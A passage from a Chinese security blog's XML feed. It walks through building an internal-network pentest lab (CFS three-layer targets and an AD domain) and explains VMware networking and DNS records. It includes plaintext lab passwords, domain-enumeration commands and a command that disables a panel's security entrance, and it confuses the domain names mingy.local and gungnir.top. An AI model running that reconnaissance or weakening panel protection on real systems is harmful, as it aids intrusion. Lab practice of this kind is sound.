          <category> 渗透测试 </category>
          
          <category> WEB安全 </category>
          
          <category> 历史漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 历史漏洞 </tag>
            
            <tag> Log4j2 </tag>
            
            <tag> Apache </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x02 - 内网靶场虚拟环境搭建</title>
      <link href="/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/0x02-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html"/>
      <url>/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/0x02-%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="多层内网环境搭建"><a href="#多层内网环境搭建" class="headerlink" title="多层内网环境搭建"></a>多层内网环境搭建</h1><h2 id="网络环境，各主机的IP："><a href="#网络环境，各主机的IP：" class="headerlink" title="网络环境，各主机的IP："></a>网络环境，各主机的IP：</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kali：192.168.1.200且桥接</span><br><span class="line">centos：</span><br><span class="line">192.168.11.11（如需上网改为桥接）</span><br><span class="line">192.168.22.11</span><br><span class="line">Ubuntu：</span><br><span class="line">192.168.22.22</span><br><span class="line">192.168.33.22</span><br><span class="line">win7：</span><br><span class="line">192.168.33.33</span><br></pre></td></tr></table></figure><h2 id="CFS三层内网靶机安装步骤"><a href="#CFS三层内网靶机安装步骤" class="headerlink" title="CFS三层内网靶机安装步骤"></a>CFS三层内网靶机安装步骤</h2><blockquote><p><a href="">CFS三层靶场搭建参考文章</a></p><p>链接:<a href="https://pan.baidu.com/s/1yVw3NzmrqraFJEgir7TgqQ">https://pan.baidu.com/s/1yVw3NzmrqraFJEgir7TgqQ</a>提取码:74u9</p></blockquote><ol><li>下载环境，导入虚拟机，点击此文件导入</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221517269.png" alt="image-20220922151701185" style="zoom:50%;" /><ol start="2"><li>输入名称及保存路径即可，路径可自行选择，这里我保存至D盘，虚拟机文件文件夹</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221517148.png" alt="image-20220922151739050" style="zoom:50%;" /><p>（同理其他两台机器一样的操作）</p><ol start="3"><li><p>配置虚拟机，虚拟网卡。点击编辑——&gt;点击虚拟网卡编辑器——&gt;点击更改设置——&gt;点击添加网络，分别添加VMnet1，VMnet2，VMnet3三张网卡——&gt;点击虚拟网卡VMnet1，在子网IP处修改IP地址为192.168.11.0，VMnet2为192.168.22.0，VMnet3为192.168.33.0——&gt;右键机器设置给Target1机器配置网络适配器1为桥接模式，网络适配器2为自定义VMnet2，给Target2机器配置网络适配器1为VMnet2，网络适配器2为VMnet3，给Target3机器配置网络适配器1为VMnet3。</p></li><li><p>开启虚拟器Target1，输入账号root 密码teamssix.com进入系统查看宝塔是否正常运行（进入系统后可输入init 切换为图形界面）</p></li><li><p>正常则使用本地机器访问宝塔后台地址IP：8888</p></li></ol><blockquote><p>产生如下提示：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">请使用正确的入口登录面板</span><br><span class="line">错误原因：当前宝塔新安装的已经开启了安全入口登录，新装机器都会随机一个8位字符的安全入口名称，亦可以在面板设置处修改，如您没记录或不记得了，可以使用以下方式解决</span><br><span class="line">解决方法：在SSH终端输入以下一种命令来解决</span><br><span class="line">1.查看面板入口：/etc/init.d/bt default</span><br><span class="line">2.关闭安全入口：rm -f /www/server/panel/data/admin_path.pl</span><br><span class="line">注意：【关闭安全入口】将使您的面板登录地址被直接暴露在互联网上，非常危险，请谨慎操作</span><br></pre></td></tr></table></figure><p>运行&#x2F;etc&#x2F;init.d&#x2F;bt default后，查看其登陆地址及密码</p><p>宝塔后台登陆地址及密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">地址：http\://Target1-ip:8888/a768f109/ </span><br><span class="line">账号：eaj3yhsl </span><br><span class="line">密码：41bb8fee</span><br></pre></td></tr></table></figure><p>配置网站绑定域名，进入后点击网站——&gt;设置——&gt;点击域名管理——&gt;输入Target1-ip(此处输入Target1机器IP地址)输入完成后点击添加——&gt;返回即可访问web页面</p></blockquote><ol start="6"><li>Target2机器web页面同理设置只是ip地址发生变化</li></ol><blockquote><p>宝塔后台登陆地址及密码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">地址：http\://Target2-IP:8888/2cc52ec0/ </span><br><span class="line">账号：xdynr37d </span><br><span class="line">密码：123qwe..</span><br></pre></td></tr></table></figure></blockquote><p>靶场搭建完毕~~</p><h1 id="内网域环境搭建"><a href="#内网域环境搭建" class="headerlink" title="内网域环境搭建"></a>内网域环境搭建</h1><h2 id="系统角色IP"><a href="#系统角色IP" class="headerlink" title="系统角色IP"></a>系统角色IP</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP配置：</span><br><span class="line">Windows Server 2012 R2：</span><br><span class="line">域控-192.168.1.1</span><br><span class="line">Windows Server 2008 R2：</span><br><span class="line">域成员-192.168.1.2</span><br><span class="line">Windows 7：</span><br><span class="line">域成员-192.168.1.3</span><br><span class="line">三台主机都要查看IP和设置固定IP地址（域中IP是固定的）</span><br><span class="line"></span><br><span class="line">DNS配置：（域成员DNS指向域控IP）</span><br><span class="line">需要注意的是，由于 Windows 7 和 Windows Server 2008 R2 是作为域中的成员主机，所以要设置首先DNS服务器为 Windows Server 2012 的 ip 地址192.168.1.1，也就是域控的地址。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">下面笔记使用下面的IP：</span><br><span class="line">也可以改成10.10.10.1网段的IP配置：</span><br><span class="line">Windows Server 2012 R2：</span><br><span class="line">域控-10.10.10.10</span><br><span class="line">Windows Server 2008 R2：</span><br><span class="line">域成员-10.10.10.20</span><br><span class="line">Windows 7：</span><br><span class="line">域成员-10.10.10.30</span><br></pre></td></tr></table></figure><blockquote><ul><li><p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MTA1ODk5NQ==&amp;mid=2247484151&amp;idx=1&amp;sn=f1e95bb472fbe2793a213a2e2d7f4ec3&amp;chksm=ec1726abdb60afbd53b23904b2bda21098ed6d0f4b2ae1748c00182e8d5e6656707a4dac35da&amp;scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzI5MTA1ODk5NQ==&amp;mid=2247484151&amp;idx=1&amp;sn=f1e95bb472fbe2793a213a2e2d7f4ec3&amp;chksm=ec1726abdb60afbd53b23904b2bda21098ed6d0f4b2ae1748c00182e8d5e6656707a4dac35da&amp;scene=21#wechat_redirect</a></p></li><li><p><a href="https://www.cnblogs.com/jassa/p/10170386.html">https://www.cnblogs.com/jassa/p/10170386.html</a></p></li><li><p><a href="https://www.cnblogs.com/-qing-/p/11193805.html">https://www.cnblogs.com/-qing-/p/11193805.html</a></p></li><li><p><a href="https://blog.csdn.net/xia739635297/article/details/104081650/">https://blog.csdn.net/xia739635297/article/details/104081650/</a></p></li></ul></blockquote><h2 id="系统下载"><a href="#系统下载" class="headerlink" title="系统下载"></a>系统下载</h2><ul><li>Windows Server 2012 R2</li></ul><blockquote><p>镜像下载：</p><p>ed2k:&#x2F;&#x2F;|file|cn_windows_server_2012_r2_vl_with_update_x64_dvd_6052729.iso|5545527296|BD499EBCABF406AB82293DD8A5803493|&#x2F;</p></blockquote><ul><li>Windows Server 2008 R2</li></ul><blockquote><p>镜像下载：</p><p>ed2k:&#x2F;&#x2F;|file|cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso|3368839168|D282F613A80C2F45FF23B79212A3CF67|&#x2F;</p></blockquote><ul><li>Windows 7 SP1</li></ul><blockquote><p>镜像下载：</p><p>ed2k:&#x2F;&#x2F;|file|cn_windows_7_enterprise_with_sp1_x64_dvd_u_677685.iso|3265574912|E9DB2607EA3B3540F3FE2E388F8C53C4|&#x2F;</p></blockquote><blockquote><p>Windows Server 2008 R2 和 Windows 7 SP1 安装 vmtools 需要安装补丁：</p><p><a href="https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419">https://www.catalog.update.microsoft.com/search.aspx?q=kb4474419</a></p><p>Windows Server 2012 R2 安装 vmtools 需要安装补丁：</p><p><a href="https://www.catalog.update.microsoft.com/Search.aspx?q=kb2919355">https://www.catalog.update.microsoft.com/Search.aspx?q=kb2919355</a></p></blockquote><h2 id="系统配置"><a href="#系统配置" class="headerlink" title="系统配置"></a>系统配置</h2><h3 id="DC"><a href="#DC" class="headerlink" title="DC"></a>DC</h3><p>Windows Server 2012 R2 作为域控制器，安装 AD 域及 DNS 服务器在新建域时，本地 Administrator 账户将成为域 Administrator 账户</p><p>域控的功能：为域内的所有机器统一分配杀毒软件和执行任务，当执行杀毒软件时，需要执行域管理者的权限</p><h4 id="网络"><a href="#网络" class="headerlink" title="网络:"></a>网络:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址：10.10.10.10</span><br><span class="line">网关：10.10.10.1</span><br><span class="line">首选DNS：127.0.0.1</span><br><span class="line"></span><br><span class="line">我们再次查看下IP，可以看到首选 DNS 服务器已经设置成 127.0.0.1 ，也就是域控制器自己，如果需要上网，可以把备用DNS服务器设置成之前的值，如下所示：</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221521303.png" alt="image-20220922152143216" style="zoom:50%;" /><h4 id="桌面图标设置"><a href="#桌面图标设置" class="headerlink" title="桌面图标设置:"></a>桌面图标设置:</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">win + r</span><br><span class="line">rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0</span><br></pre></td></tr></table></figure><h4 id="安装域"><a href="#安装域" class="headerlink" title="安装域"></a>安装域</h4><h5 id="修改计算机名为-DC"><a href="#修改计算机名为-DC" class="headerlink" title="修改计算机名为 DC"></a>修改计算机名为 DC</h5><p>win + r 输入 sysdm.cpl 打开系统属性窗口，点击 更改 重命名此计算机为 DC ，点击确定，重启。</p><h5 id="添加角色和功能"><a href="#添加角色和功能" class="headerlink" title="添加角色和功能"></a>添加角色和功能</h5><p>打开服务器管理器，在仪表板选择添加角色和功能，进入 添加角色和功能向导：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221522780.png" alt="image-20220922152224671" style="zoom:50%;" /><blockquote><ul><li>开始之前 -&gt; 下一步</li><li>安装类型 -&gt; 基于角色或基于功能的安装（默认） -&gt; 下一步</li><li>服务器选择 -&gt; 从服务器池中选择服务器（默认） -&gt; 下一步</li><li>服务器角色 -&gt; 勾选 Active Directory 域服务 -&gt; 添加功能 -&gt; 下一步</li></ul><blockquote><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221523399.png" alt="image-20220922152318312" style="zoom:33%;" /><p>Active Directory  域服务(AD DS)存储有关网络上的对象的信息，并向用户和网络管理员提供这些信息， AD DS  使用域控制器，向网络用户授予通过单个登录进程访问网络上任意位置的允许资源的权限。</p><p>注意：这里的 DNS  服务器可勾选，也可不勾选，在安装时，是会默认安装的。</p></blockquote><ul><li>功能 -&gt; 默认 -&gt; 下一步</li><li>AD DS -&gt; 下一步</li></ul><blockquote><p>**Active Directory 域服务(AD DS)**存储有关网络上的用户、计算机和其他设备的信息。 AD DS 有助于管理员安全地管理该信息，并有助于用户间的资源共享和协作。启用目录的应用程序（例如Microsoft Exchange Server )和其他 Windows Server 技术（例如组策略）也需要 AD DS 。</p></blockquote><p>注意事项：</p><blockquote><ul><li><p>· 若要有助于确保在某台服务器中断的情况下用户仍然可以登录到网络，请至少为域安装两个域控制（预防单点故障）</p></li><li><p>· AD DS 要求将 DNS 服务器安装在网络上。如果未安装 DNS 服务器，系统会提示你在该计算机上安装DNS 服务器角色。</p></li><li><p>· 安装 AD DS 还将安装 AD DS 所需的 DFS 命名空间、 DFS 复制和文件复制服务。（Microsoft文件分布系统 (Dfs) 是一个网络服务器组件，它能够使你更容易地在网络上查询和管理数据）</p></li></ul></blockquote><ul><li>确认 -&gt; 安装</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221525836.png" alt="image-20220922152507751" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221525707.png" alt="image-20220922152514621" style="zoom:50%;" /><blockquote><p>导出配置设置 DeploymentConfigTemplate.xml ，即可在 powershell 中执行如下命令进行相同的安装</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Install-WindowsFeature</span> <span class="literal">-ConfigurationFilePath</span> DeploymentConfigTemplate.xml</span><br></pre></td></tr></table></figure></blockquote><ul><li>结果 -&gt; 等待安装完成，点击 将此服务器提升为域控制器</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527028.png" alt="image-20220922152715934" style="zoom:50%;" /></blockquote><h5 id="进入-Active-Directory-域服务配置向导-："><a href="#进入-Active-Directory-域服务配置向导-：" class="headerlink" title="进入 Active Directory 域服务配置向导 ："></a>进入 Active Directory 域服务配置向导 ：</h5><blockquote><ul><li>部署配置 -&gt; 添加新林 -&gt; 填写根域名 mingy.local -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527468.png" alt="image-20220922152731383" style="zoom:50%;" /><ul><li>域控制器选项 -&gt; 输入目录服务还原模式(DSRM)密码 -&gt; 此密码可以与 Administrator 账号密码不一致 -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527501.png" alt="image-20220922152743410" style="zoom:50%;" /><ul><li>DNS 选项 -&gt; 默认 -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221527992.png" alt="image-20220922152752902" style="zoom:50%;" /><ul><li>其他选项 -&gt; NetBIOS 域名 MINGY （默认） -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221528433.png" alt="image-20220922152807338" style="zoom:50%;" /><ul><li>路径 -&gt; 指定 AD DS 数据库、日志文件和 SYSVOL 的位置（默认） -&gt; 下一步</li></ul><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">数据库文件夹：C:\Windows\NTDS</span><br><span class="line">日志文件文件夹：C:\Windows\NTDS</span><br><span class="line">SYSVOL文件夹：C:\Windows\SYSVOL</span><br></pre></td></tr></table></figure><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221528977.png" alt="image-20220922152848885" style="zoom:50%;" /></blockquote><ul><li>查看选项 -&gt; 默认 -&gt; 下一步</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221529605.png" alt="image-20220922152900516" style="zoom:50%;" /><blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#</span><br><span class="line"># 用于 AD DS 部署的 Windows PowerShell 脚本</span><br><span class="line">#</span><br><span class="line">Import-Module ADDSDeployment</span><br><span class="line">Install-ADDSForest `</span><br><span class="line">-CreateDnsDelegation:$false `</span><br><span class="line">-DatabasePath &quot;C:\Windows\NTDS&quot; `</span><br><span class="line">-DomainMode &quot;Win2012R2&quot; `</span><br><span class="line">-DomainName &quot;gungnir.top&quot; `</span><br><span class="line">-DomainNetbiosName &quot;GUNGNIR&quot; `</span><br><span class="line">-ForestMode &quot;Win2012R2&quot; `</span><br><span class="line">-InstallDns:$true `</span><br><span class="line">-LogPath &quot;C:\Windows\NTDS&quot; `</span><br><span class="line">-NoRebootOnCompletion:$false `</span><br><span class="line">-SysvolPath &quot;C:\Windows\SYSVOL&quot; `</span><br><span class="line">-Force:$true</span><br></pre></td></tr></table></figure></blockquote><ul><li>先决条件检查 -&gt; 安装 -&gt; 安装完成后会重启</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221529088.png" alt="image-20220922152927992" style="zoom:50%;" /><ul><li>重启后在输入账号密码处，可以看到账号名称变为了 MINGY\Administrator</li></ul><blockquote><p>登录一个域，需要在账号前面加上域名称和斜杠</p><p>登录本地账号，需要输入 .\administrator 来登录</p></blockquote><ul><li>登录后可以在服务器管理器中看到新增的 AD DS 和 DNS 服务器</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221529036.png" alt="image-20220922152942944" style="zoom:50%;" /></blockquote><blockquote><p><a href="http://go.microsoft.com/fwlink/?LinkId=219491">http://go.microsoft.com/fwlink/?LinkId=219491</a></p></blockquote><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><p>Windows Server 2008 R2 作为 WEB 服务器，安装 WEB 应用，加入域</p><h4 id="网络："><a href="#网络：" class="headerlink" title="网络："></a>网络：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址：10.10.10.20</span><br><span class="line">网关：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10</span><br></pre></td></tr></table></figure><h4 id="加入-gungnir-top-域"><a href="#加入-gungnir-top-域" class="headerlink" title="加入 gungnir.top 域"></a>加入 gungnir.top 域</h4><blockquote><ol><li>win + r 输入 sysdm.cpl 进入系统属性窗口，选择更改</li><li>修改计算机名为： WEB</li><li>修改隶属于：域 gungnir.top</li><li>点击确定，需要输入域管理员的账号密码</li><li>加入域成功，需要重启计算机</li></ol></blockquote><blockquote><p> 计算机全名 WEB.mingy.local</p></blockquote><h3 id="PC"><a href="#PC" class="headerlink" title="PC"></a>PC</h3><h4 id="网络：-1"><a href="#网络：-1" class="headerlink" title="网络："></a>网络：</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IP地址：10.10.10.30</span><br><span class="line">网关：10.10.10.1</span><br><span class="line">首选DNS：10.10.10.10</span><br></pre></td></tr></table></figure><h4 id="加入-gungnir-top-域-1"><a href="#加入-gungnir-top-域-1" class="headerlink" title="加入 gungnir.top 域"></a>加入 gungnir.top 域</h4><blockquote><ol><li>win + r 输入 sysdm.cpl 进入系统属性窗口，选择更改</li><li>修改计算机名为： PC</li><li>修改隶属于：域 gungnir.top</li><li>点击确定，需要输入域管理员的账号密码</li><li>加入域成功，需要重启计算机</li></ol></blockquote><blockquote><p>计算机全名 PC.gungnir.top</p></blockquote><h2 id="域内主机及用户管理"><a href="#域内主机及用户管理" class="headerlink" title="域内主机及用户管理"></a>域内主机及用户管理</h2><p>域中一些简单命令：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">//查看域内用户</span><br><span class="line">net user /domain</span><br><span class="line">//查看域管理员</span><br><span class="line">net <span class="built_in">group</span> <span class="string">&quot;domain admins&quot;</span> /domain</span><br></pre></td></tr></table></figure><ol><li><code>win + r 输入 dsa.msc</code> 进入 Active Direcotry 用户和计算机窗口</li></ol><p>或者：点击开始–&gt;管理工具–&gt;双击 Active Directory 用户和计算机</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221536680.png" alt="image-20220922153638598" style="zoom:50%;" /><ol start="2"><li>选择gungnir.top下的 Computers ，可以查看之前添加到域内的两台计算机</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221536610.png" alt="image-20220922153653541" style="zoom:50%;" /><ol start="3"><li>加入域后，需要有域账号才能登录域内主机，我们先创建两个部门，分别为运维部和行政部，右键选择gungnir.top-&gt; 新建 -&gt; 组织单位</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537182.png" alt="image-20220922153706094" style="zoom:50%;" /><ol start="4"><li>在运维部中新建用户 john</li></ol><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537741.png" alt="image-20220922153721647" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537775.png" alt="image-20220922153737676" style="zoom:50%;" /><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221537972.png" alt="image-20220922153745863" style="zoom:50%;" /><ol start="5"><li>在行政部中新建用户 bob</li></ol><p>步骤同上</p><ol start="6"><li>在 WEB.gungnir.top 计算机登录 john 账号</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gungnir\john</span><br><span class="line">1qaz@WSX</span><br></pre></td></tr></table></figure><ol start="7"><li>在 PC.mingy.local 计算机登录 bob 账号</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gungnir\bob</span><br><span class="line">1qaz@WSX</span><br></pre></td></tr></table></figure><h2 id="vmware网络配置"><a href="#vmware网络配置" class="headerlink" title="vmware网络配置"></a>vmware网络配置</h2><h3 id="仅主机模式"><a href="#仅主机模式" class="headerlink" title="仅主机模式"></a>仅主机模式</h3><p>实质原理：在Host-Only模式下，虚拟网络是一个全封闭的网络，它唯一能够访问的就是主机。其实Host-Only网络和NAT网络很相似，不同的地方就是 Host-Only网络没有NAT服务，所以虚拟网络不能连接到Internet。主机和虚拟机之间的通信是通过VMwareNetworkAdepterVMnet1虚拟网卡来实现的。</p><ul><li>网络拓扑如下</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221538227.png" alt="image-20220922153854140" style="zoom:50%;" /><ul><li>配置步骤</li></ul><p>1、点“编辑”设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221539342.png" alt="image-20220922153956221" style="zoom:50%;" /><p>2、设置虚拟机为Host-Only模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540726.png" alt="image-20220922154008639" style="zoom:50%;" /><p>3、设置网卡文件vim &#x2F;etc&#x2F;network&#x2F;interfaces</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540663.png" alt="image-20220922154018569" style="zoom:50%;" /><p>4、保存退出，然后重启网络服务 systemctl restart networking</p><h3 id="桥接模式"><a href="#桥接模式" class="headerlink" title="桥接模式"></a>桥接模式</h3><p>桥接模式可以简单理解为通过物理主机网卡架设了一座桥，从而连入到了实际网络中。因此，虚拟机可以被分配与物理主机相同网段的独立IP，所有网络功能和网络中的真实机器几乎完全一样。桥接模式下的虚拟机和网内真实计算机所处的位置是一样的。在Bridged模式下，电脑设备创建的虚拟机就像一台真正的计算机一样，它会直接连接到实际的网络上，上网与宿主机（电脑设备）没有联系。Bridged网络类型的原理逻辑图下图所示。所以，现在是不是可以理解 在虚拟网卡中 没有 VMware Network AdepterVMnet0 了 ，因为它就是 宿主机 所在局域网 中的另外一台主机。</p><ul><li>拓扑图</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540493.png" alt="image-20220922154036421" style="zoom:50%;" /><ul><li>配置步骤：</li></ul><p>1、点击“编辑虚拟机设置”来设置网卡模式。</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540165.png" alt="image-20220922154047072" style="zoom:50%;" /><p>2、如想配置静态地址则可打开 vim &#x2F;etc&#x2F;network&#x2F;interfaces 进行配置</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221540009.png" alt="image-20220922154057911" style="zoom:50%;" /><p>3、在配置dns解析服务器使用命令打开 vi &#x2F;etc&#x2F;resolv.conf</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221541185.png" alt="image-20220922154106114" style="zoom:50%;" /><h3 id="NAT模式"><a href="#NAT模式" class="headerlink" title="NAT模式"></a>NAT模式</h3><p>NAT（地址转换）</p><p>NAT（Network Address Translation），网络地址转换，NAT模式是比较简单的实现虚拟机上网的方式，NAT模式的虚拟机就是通过宿主机（物理电脑）上网和交换数据的。 这种模式也是使用Vmware虚拟机最常用的模式。在NAT模式下，虚拟机的网卡连接到宿主机的VMnet8上（安装完Vmware虚拟机会多出两个虚拟网卡Vmware1和Vmware8）。此时系统的VMware NAT Service服务就充当了路由器，负责将虚拟机发到VMnet8的包进行地址转换之后发到实际的网络上，再将实际网络上返回的包进行地址转换后通过VMnet8发送给虚拟机。VMware DHCP Service负责为虚拟机分配IP地址。NAT网络类型的原理逻辑图如下图所示。</p><ul><li>拓扑图</li></ul><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221541649.png" alt="image-20220922154124574" style="zoom:50%;" /><ul><li>配置步骤：</li></ul><p>1、kali如果使用dhcp则可不进行配置</p><p>2、配置静态ip：</p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202209221541998.png" alt="image-20220922154132900" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
          <category> 内网 </category>
          
          <category> 内网靶场 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS</title>
      <link href="/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/DNS.html"/>
      <url>/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%BA%94%E7%94%A8%E5%B1%82/DNS/DNS.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h1><p>域名注册完成后首先需要做域名解析，域名解析就是把域名指向网站所在服务器的IP，让人们通过注册的域名可以访问到网站。</p><p>IP地址是网络上标识服务器的数字地址，为了方便记忆，使用域名来代替IP地址。域名解析就是域名到IP地址的转换过程，域名的解析工作由DNS服务器完成。</p><p>DNS服务器会把域名解析到一个IP地址，然后在此IP地址的主机上将一个子目录与域名绑定。</p><p>域名解析时会添加解析记录，这些记录有：A记录、AAAA记录、CNAME记录、MX记录、NS记录、TXT记录。</p><h2 id="DNS记录类型"><a href="#DNS记录类型" class="headerlink" title="DNS记录类型"></a>DNS记录类型</h2><blockquote><p><a href="https://developer.aliyun.com/article/331012">DNS记录类型介绍(A记录、MX记录、NS记录等)</a></p></blockquote><h3 id="A记录"><a href="#A记录" class="headerlink" title="A记录"></a>A记录</h3><blockquote><p>用来指定主机名（或域名）对应的IP地址记录</p><p>通俗来说A记录就是服务器的IP，域名绑定A记录就是告诉DNS，当你输入域名的时候给你引导向设置在DNS的A记录所对应的服务器。</p></blockquote><h3 id="NS记录"><a href="#NS记录" class="headerlink" title="NS记录"></a>NS记录</h3><blockquote><p>域名服务器记录，用来指定该域名由哪个DNS服务器来进行解析。</p></blockquote><h3 id="MX记录"><a href="#MX记录" class="headerlink" title="MX记录"></a>MX记录</h3><blockquote><p>邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器</p></blockquote><blockquote><p>在后续学习邮件伪造的时候会碰到一个叫SPF的东西，，，好像是预防邮件伪造，后面学到了再说</p></blockquote><h3 id="CNAME记录"><a href="#CNAME记录" class="headerlink" title="CNAME记录"></a>CNAME记录</h3><blockquote><p>别名记录，允许您将多个名字映射到同一台计算机</p></blockquote><blockquote><p><strong>简单来说，A记录就是把一个域名解析到一个IP地址，而CNAME记录就是把域名解析到另外一个域名。</strong></p></blockquote><h3 id="TXT记录"><a href="#TXT记录" class="headerlink" title="TXT记录"></a>TXT记录</h3><blockquote><p>一般指某个主机名或域名的说明</p></blockquote><h2 id="泛域名与泛解析"><a href="#泛域名与泛解析" class="headerlink" title="泛域名与泛解析"></a>泛域名与泛解析</h2><p>泛域名是指在一个域名根下，以 *.Domain.com 的形式表示这个域名根所有未建立的子域名。  泛解析是把 *.Domain.com 的A记录解析到某个IP 地址上，通过访问任意的前缀 .domain.com 都能访问到你解析的站点上。</p><blockquote><p>渗透过程中碰到泛解析的话，往往收集的子域名信息就没有太大意义了，因为都是解析到同一个IP</p></blockquote><h2 id="域名绑定"><a href="#域名绑定" class="headerlink" title="域名绑定"></a>域名绑定</h2><p>域名绑定是指将域名指向服务器IP的操作</p><h1 id="如何查看自己VPS的域名服务器？"><a href="#如何查看自己VPS的域名服务器？" class="headerlink" title="如何查看自己VPS的域名服务器？"></a>如何查看自己VPS的域名服务器？</h1><p>我们可以自己查询下域名服务器，以确定是否设置生效。CMD 运行 <code>nslookup -qt=ns 域名</code> -&gt; 回车，nameserver 后面的就是域名服务器地址。</p><p>实际上有了自己的域名后，做一做这个域名解析的过程就懂了</p><p>有的网站，其域名服务器是指向自己的，以mingy老师这个为例：</p><p><img src="https://alvin-note.oss-cn-hangzhou.aliyuncs.com/Markdown/202210051521156.png" alt="image-20221005152100001"></p><p>他是如何设置的呢？</p><p>即将其域名的NS值，设置为ns.mingy.xyz，这样即将其域名服务器指向自己的ns.mingy.xyz子域名上面，ns的A记录，指向了本机的IP，所以实际上就是web服务和域名解析服务器都在同一台机器之上~~~</p><h1 id="常用DNS-服务器"><a href="#常用DNS-服务器" class="headerlink" 